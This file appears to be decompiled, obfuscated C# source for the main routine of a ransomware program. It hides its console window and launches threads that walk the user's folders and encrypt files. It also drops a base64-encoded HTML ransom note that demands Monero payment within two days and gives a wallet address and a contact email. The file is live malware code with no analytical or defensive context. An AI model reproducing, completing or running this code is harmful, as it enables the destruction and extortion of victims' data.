using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace jgfjkggkiiy;

internal class Program
{
	public class DummyParser : ifp
	{
		public void ParseFile(string filePath)
		{
			Thread.Sleep(0);
			Console.WriteLine("Parsing files");
		}
	}

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void processLogQueueOnMainThreadHasPermissions(string[] args)
	{
		int num = 0;
		ifc fileChecker = default(ifc);
		ifp fileParser = default(ifp);
		iep iep2 = default(iep);
		do
		{
			if (num == 5)
			{
				fileChecker = new fc();
				num = 6;
			}
			if (num == 4)
			{
				fileParser = new fp(iep2);
				num = 5;
			}
			if (num == 2)
			{
				ShowWindow(GetConsoleWindow(), 0);
				num = 3;
			}
			if (num == 1)
			{
				Thread.Sleep(0);
				num = 2;
			}
			if (num == 6)
			{
				List<Thread> list = DeleteGroupget_NameLoad(((ide)new FolderBrowser()).GetStartingFolders(), new dw(fileChecker, fileParser));
				list.ForEach(delegate(Thread encThread)
				{
					encThread.Start();
				});
				iep2.GetEncryptionKey();
				byte[] bytes = Convert.FromBase64String("PGh0bWwgbGFuZz0iZW4iPgo8aGVhZD48L3N0eWxlPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPHRpdGxlPkVuY3J5cHRlZG5jcnlwdGVkPC90aXRsZT4KPC9oZWFkPgoKPGJvZHk+CiAgPHN0eWxlPgogICBib2R5IHsKICAgIGJhY2tncm91bmQ6ICMwMDAwMDA7CiAgICBjb2xvcjogI0ZGMDAwMDsKCWZvbnQtc2l6ZTogMTdweDsKCXRleHQtYWxpZ246IGNlbnRlcgogICB9CiAgPC9zdHlsZT4KPGgzPk9vcHMsIHlvdXIgZmlsZXMgYXJlIGVuY3J5cHRlZCEhITwvaDM+CjxoMz5XaGF0IGhhcHBlbmVkIHRvIG15IGNvbXB1dGVyPzwvaDM+CjxwPllvdXIgaW1wb3J0YW50IGZpbGVzIGFyZSBlbmNyeXB0ZWQuPGJyIC8+TWFueSBvZiB5b3VyIGRvY3VtZW50cywgcGhvdG9zLCB2aWRlb3MgYW5kIG90aGVyIGZpbGVzIG5vIGxvbmdlciB3b3JrIGJlY2F1c2UgdGhleSBhcmUgZW5jcnlwdGVkLCBtYXliZSB5b3UgYXJlIGJ1c3kgbG9va2luZyBmb3IgYSB3YXkgdG8gcmVjb3ZlciB5b3VyIGZpbGVzLCBidXQgZG8gbm90IHdhc3RlIHlvdXIgdGltZSwgbm8gb25lIGNhbiByZWNvdmVyIHlvdXIgZmlsZXMgd2l0aG91dCBvdXIgZGVjcnlwdGlvbiBzZXJ2aWNlLjwvcD4KPGgzPldpbGwgSSBiZSBhYmxlIHRvIHJlY292ZXIgbXkgZmlsZXM/PC9oMz4KPHA+V2UgZ3VhcmFudGVlIHRoYXQgeW91IGNhbiByZWNvdmVyIGFsbCB5b3VyIGZpbGVzIHNhZmVseSBhbmQgZWFzaWx5IGFmdGVyIG91ciBjb25kaXRpb25zIGFyZSBtZXQuPC9wPgo8aDM+VG8gZGVjcnlwdCBmaWxlcywgeW91IG5lZWQgdG8gcGF5LjwvaDM+IAo8cD5XZSBnaXZlIHlvdSAyIGRheXMgdG8gcGF5LCBpZiB5b3UgZG9uJ3QgbWFrZSBpdCwgdGhlIGtleSB0byBkZWNyeXB0IHlvdXIgZmlsZXMgd2lsbCBhdXRvbWF0aWNhbGx5IGJlIGRlbGV0ZWQgZnJvbSBvdXIgc2VydmVyIGFuZCB5b3UgbG9zdCB5b3VyIGZpbGVzIGZvcmV2ZXIhPC9wPgo8cD4wLTQ4IGhvdXJzID0gJCA1MDA8L3A+CjxoMz5Ib3cgZG8gaSBwYXk/PC9oMz4KPHA+V2UgYWNjZXB0IHBheW1lbnQgaW4gY3J5cHRvY3VycmVuY3kgTW9uZXJvIChYTVIpLiBXaGF0IGlzIE1vbmVybyAoWE1SKSB5b3UgY2FuIGZpbmQgaGVyZTogPGEgdGl0bGU9ImZhcSIgaHJlZj0iaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTW9uZXJvXyhjcnlwdG9jdXJyZW5jeSkiIHRhcmdldD0iX2JsYW5rIiByZWw9Im5vb3BlbmVyIj5MaW5rIHRvIFdpa2lwZWRpYTwvYT48L3A+CjxwPkhvdyB0byBidXkgTW9uZXJvIChYTVIpIHdpdGggVVNEIENyZWRpdC9EZWJpdCBDYXJkPyBZb3UgY2FuIGZpbmQgaGVyZTogPGEgdGl0bGU9ImZhcSIgaHJlZj0iaHR0cHM6Ly9yaXBwbGVjb2lubmV3cy5jb20vYnV5LW1vbmVyby14bXItd2l0aC11c2QtY3JlZGl0LWNhcmQiIHRhcmdldD0iX2JsYW5rIiByZWw9Im5vb3BlbmVyIj5MaW5rIGhvdyB0byBidXk8L2E+PC9wPgo8cD5Zb3UgY2FuIGJ1eSBNb25lcm8gKFhNUikgd2l0aCBVU0QgQ3JlZGl0L0RlYml0IENhcmQgaGVyZTogPGEgdGl0bGU9ImZhcSIgaHJlZj0iaHR0cHM6Ly9jaGFuZ2VsbHkuY29tL2V4Y2hhbmdlL3VzZC94bXIiIHRhcmdldD0iX2JsYW5rIiByZWw9Im5vb3BlbmVyIj5QYXltZW50IGxpbms8L2E+PC9wPgo8aDM+VXNlIHRoaXMgTW9uZXJvIChYTVIpIHdhbGxldCBhZGRyZXNzIGZvciBwYXltZW50OjwvaDM+CjxwPjQ0NkR6dDN2cFRzRzZYb0oxUm5velk0djJqclNkcVlBVWpVVzdVN01WbVJIVGhRRHhtZlNkcVhadUdSQWFSU214OVJaQzhwRDhGeUdmWDRzRFpxZnNDb3hFS2JrWHA4PC9wPgo8aDM+WW91ciBwZXJzb25hbCBjb2RlLCBlbnRlciBpdCBpbiB0aGUgc3ViamVjdCBsaW5lIG9mIHRoZSBtYWlsIHdoZW4gc2VuZGluZyBtYWlsOjwvaDM+CjxwPjE0NTU3PC9wPgo8aDM+Q29udGFjdCBlbWFpbCBmb3IgYW55IHF1ZXN0aW9uOjwvaDM+CjxwPnlvZ3luaWNvZkBwcm90b25tYWlsLmNvbTwvcD4KPGgzPkFmdGVyIHBheW1lbnQsIHdyaXRlIHRvIG91ciBlbWFpbCwgaW5kaWNhdGUgeW91ciBwZXJzb25hbCBjb2RlIGluIHRoZSBzdWJqZWN0IGxpbmUgYW5kIHdlIHdpbGwgc2VuZCB5b3UgYSBkZWNvZGVyIGluIGEgcmVzcG9uc2UgbGV0dGVyLjwvaDM+CjwvYm9keT4KCjwvaHRtbD4=");
				new MessageWriter(Encoding.UTF8.GetString(bytes), "Read-me!", 20).ParseDoubleadd_OnPluginsLoadedget_MemberSince();
				list.ForEach(delegate(Thread encThread)
				{
					encThread?.Join();
				});
				num = 7;
			}
			if (num == 3)
			{
				iep2 = new xep();
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 7);
	}

	private static List<Thread> DeleteGroupget_NameLoad(List<string> startFolders, dw directoryWalker)
	{
		int num = 0;
		List<Thread> list = default(List<Thread>);
		List<string>.Enumerator enumerator = default(List<string>.Enumerator);
		_003C_003Ec__DisplayClass6_0 _003C_003Ec__DisplayClass6_ = default(_003C_003Ec__DisplayClass6_0);
		do
		{
			if (num == 3)
			{
				list = new List<Thread>();
				num = 4;
			}
			if (num == 4)
			{
				enumerator = startFolders.GetEnumerator();
				num = 5;
			}
			if (num == 1)
			{
				_003C_003Ec__DisplayClass6_ = new _003C_003Ec__DisplayClass6_0();
				num = 2;
			}
			if (num == 2)
			{
				_003C_003Ec__DisplayClass6_.directoryWalker = directoryWalker;
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 5);
		try
		{
			while (enumerator.MoveNext())
			{
				_003C_003Ec__DisplayClass6_0 _003C_003Ec__DisplayClass6_2 = _003C_003Ec__DisplayClass6_;
				string folder = enumerator.Current;
				list.Add(new Thread((ThreadStart)delegate
				{
					_003C_003Ec__DisplayClass6_2.directoryWalker.GetTypesFromInterfacewriteToConsoleGetPermissions(folder);
				}));
			}
			return list;
		}
		finally
		{
			((IDisposable)enumerator).Dispose();
		}
	}
}
